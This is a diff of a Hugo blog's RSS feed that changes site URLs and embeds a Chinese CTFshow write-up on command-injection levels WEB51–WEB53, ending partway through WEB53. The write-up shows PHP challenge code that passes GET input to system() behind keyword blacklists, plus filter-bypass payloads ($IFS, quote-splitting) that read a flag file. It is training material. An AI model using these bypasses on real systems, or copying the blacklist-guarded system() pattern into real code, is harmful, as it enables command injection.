@@ -2,25 +2,17 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>清尘博客 - 静心</title>
-        <link>http://localhost:1313/</link>
+        <link>https://blog.kingbatsoft.top/</link>
         <description>Recent content on 清尘博客 - 静心</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Kingbatsoft</copyright>
-        <lastBuildDate>Tue, 18 Mar 2025 14:13:24 +0800</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>CTF_show Web 命令执行writeup P3 WEB51-WEB60</title>
-        <link>http://localhost:1313/p/ctfshow_web_command_write_up_3/</link>
-        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
+        <lastBuildDate>Sat, 22 Mar 2025 20:27:24 +0800</lastBuildDate><atom:link href="https://blog.kingbatsoft.top/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>五子棋v2.0</title>
+        <link>https://blog.kingbatsoft.top/p/fivechessv2/</link>
+        <pubDate>Sat, 22 Mar 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/ctfshow_web_command_write_up_3/</guid>
-        <description></description>
-        </item>
-        <item>
-        <title>五子棋</title>
-        <link>http://localhost:1313/p/fivechessv1/</link>
-        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
-        
-        <guid>http://localhost:1313/p/fivechessv1/</guid>
+        <guid>https://blog.kingbatsoft.top/p/fivechessv2/</guid>
         <description>&lt;p&gt;&lt;del&gt;&lt;em&gt;阿伟你又在打电动喔，休息一下吧，去看看书好不好&lt;/em&gt;&lt;/del&gt;&lt;/p&gt;
 &lt;style&gt;
   .gomoku-container {
@@ -44,11 +36,203 @@
 </description>
         </item>
         <item>
+        <title>CTF_show Web 命令执行writeup P3 WEB51-WEB60</title>
+        <link>https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_3/</link>
+        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_3/</guid>
+        <description>&lt;h1 id=&#34;ctfshow-web-命令执行writeup-part3&#34;&gt;CTFSHOW web 命令执行WriteUP Part3
+&lt;/h1&gt;&lt;h2 id=&#34;web51&#34;&gt;WEB51
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# -*- coding: utf-8 -*-
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @Author: h1xa
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @Date:   2020-09-05 20:49:30
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @Last Modified by:   h1xa
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @Last Modified time: 2020-09-05 22:42:52
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @email: h1xa@ctfer.com
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @link: https://ctfer.com
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;*/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/\;|cat|flag| |[0-9]|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x09&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x26&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里把tac也过滤了，有两种方法：
+1.使用&amp;rsquo;&amp;lsquo;绕过过滤
+2.使用其他指令绕过比如rev，hexdump，vi，nl&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;27&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;27&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;fl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;27&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;27&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ag&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;web52&#34;&gt;WEB52
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# -*- coding: utf-8 -*-
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @Author: h1xa
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @Date:   2020-09-05 20:49:30
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @Last Modified by:   h1xa
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @Last Modified time: 2020-09-05 22:50:30
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @email: h1xa@ctfer.com
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @link: https://ctfer.com
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;*/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x09&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x26&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|\&amp;gt;|\&amp;lt;/i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这次flag在根目录，不过把&amp;lt;也过滤了，可以使用$IFS绕过&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/?c&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;nl&lt;span class=&#34;nv&#34;&gt;$IFS&lt;/span&gt;/fla&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;g&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/?c&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ca&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$IFS&lt;/span&gt;/fla&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;g&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;web53&#34;&gt;WEB53
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# -*- coding: utf-8 -*-
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @Author: h1xa
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @Date:   2020-09-05 20:49:30
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @Last Modified by:   h1xa
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @Last Modified time: 2020-09-07 18:21:02
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @email: h1xa@ctfer.com
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;# @link: https://ctfer.com
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;*/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
